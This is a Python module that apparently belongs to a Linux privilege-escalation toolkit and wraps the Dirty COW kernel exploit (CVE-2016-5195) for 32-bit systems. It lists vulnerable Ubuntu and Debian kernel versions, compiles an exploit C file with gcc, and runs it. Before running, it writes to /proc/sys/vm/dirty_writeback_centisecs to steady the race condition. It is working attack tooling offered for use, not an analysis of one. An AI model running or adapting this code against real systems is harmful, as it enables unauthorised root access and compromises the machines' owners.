"""
Dirty Cow
"""
import os
from exploits.exploit import LinuxExploit
from src.kernels import KernelWindow
from constants import *


class CVE20165195_32(LinuxExploit):
	def __init__(self):
		super().__init__()
		self.name = "CVE20165195_32"
		self.formatted_name = "CVE-2016-5195 (x86)"
		self.e_type = "linux"
		self.brief_desc = "Dirty COW race condition root priv esc for 32 bit"
		self.reliability = HIGH_RELIABILITY
		self.vulnerable_base = KernelWindow(GENERIC_LINUX, BASE_VULNERABLE, 2, 0, 0, 4, 8, 3)
		self.vulnerable_kernels = [
			KernelWindow(UBUNTU_16, VERSION_VULNERABLE, 2, 0, 0, 4, 8, 0),
			KernelWindow(UBUNTU_16, VERSION_VULNERABLE, 2, 0, 0, 4, 4, 0),
			KernelWindow(UBUNTU_14, VERSION_VULNERABLE, 2, 0, 0, 4, 4, 0),
			KernelWindow(UBUNTU_14, VERSION_VULNERABLE, 2, 0, 0, 3, 13, 0),
			KernelWindow(UBUNTU_12, VERSION_VULNERABLE, 2, 0, 0, 3, 2, 0),
			KernelWindow(DEBIAN_9, VERSION_VULNERABLE, 2, 0, 0, 4, 7, 8),
			KernelWindow(DEBIAN_8, VERSION_VULNERABLE, 2, 0, 0, 3, 16, 36),
			KernelWindow(DEBIAN_7, VERSION_VULNERABLE, 2, 0, 0, 3, 2, 82),
		]
		self.exploit_kernels = [
			KernelWindow(UBUNTU_16, EXPLOIT_AVAILABLE, 2, 0, 0, 4, 8, 0),
			KernelWindow(UBUNTU_16, EXPLOIT_AVAILABLE, 2, 0, 0, 4, 4, 0),
			KernelWindow(UBUNTU_14, EXPLOIT_AVAILABLE, 2, 0, 0, 4, 4, 0),
			KernelWindow(UBUNTU_14, EXPLOIT_AVAILABLE, 2, 0, 0, 3, 13, 0),
			KernelWindow(UBUNTU_12, EXPLOIT_AVAILABLE, 2, 0, 0, 3, 2, 0),
			KernelWindow(DEBIAN_9, EXPLOIT_AVAILABLE, 2, 0, 0, 4, 7, 8),
			KernelWindow(DEBIAN_8, EXPLOIT_AVAILABLE, 2, 0, 0, 3, 16, 36),
			KernelWindow(DEBIAN_7, EXPLOIT_AVAILABLE, 2, 0, 0, 3, 2, 82),
		]
		self.architecture = ARCHITECTURE_i686
		self.source_c_path = os.path.join(LINUX_EXPLOIT_SOURCE_PATH, "{}.c".format(self.name))
		self.compilation_path = os.path.join(PLAYGROUND_PATH, self.name)
		self.compilation_command = "gcc {} -o {} -pthread".format(self.source_c_path, self.compilation_path)
		self.exploit_command = self.compilation_path

	def determine_vulnerability(self):
		color_print("\t[*] checking exploitation prerequisites for {}".format(self.name), color="blue")
		# if kernel matches...it should be vulnerable
		color_print("\t[+] system appears to be vulnerable to {}".format(self.name), color="green")
		return True

	def exploit(self):
		# should stabilize exploit
		stabilization_command = "echo 0 > /proc/sys/vm/dirty_writeback_centisecs"
		color_print(("\t[*] stabilizing exploit:\n\t\t`{}`".format(stabilization_command)))
		self.shell_results(stabilization_command)
		# call super-class exploit
		super(CVE20165195_32, self).exploit()
